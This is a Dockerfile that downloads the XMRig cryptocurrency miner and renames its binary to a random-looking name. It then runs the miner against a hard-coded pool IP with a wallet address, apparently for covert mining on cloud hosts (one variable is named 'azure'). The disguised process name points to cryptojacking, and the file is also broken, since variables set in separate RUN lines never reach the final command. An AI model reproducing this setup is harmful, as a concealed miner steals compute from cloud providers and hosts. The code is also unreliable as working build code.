FROM ubuntu 16.04

ENV VERSION 4.6.2-beta

RUN apt-get update && apt-get install -y wget
RUN azure=mxsemsdnlkdj;
RUN a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
RUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
RUN tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
RUN cd xmrig-$VERSION
RUN mv xmrig $azure -n
RUN cp $azure "$cpuname"

ENV POOL 158.101.6.131:2222
ENV USERNAME WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
ENV DONATE 1
ENV THREADS 4

CMD ./"${cpuname}" -o $POOL -u $USERNAME -p x -a rx/wow -k --donate-level=$DONATE -t $THREADS
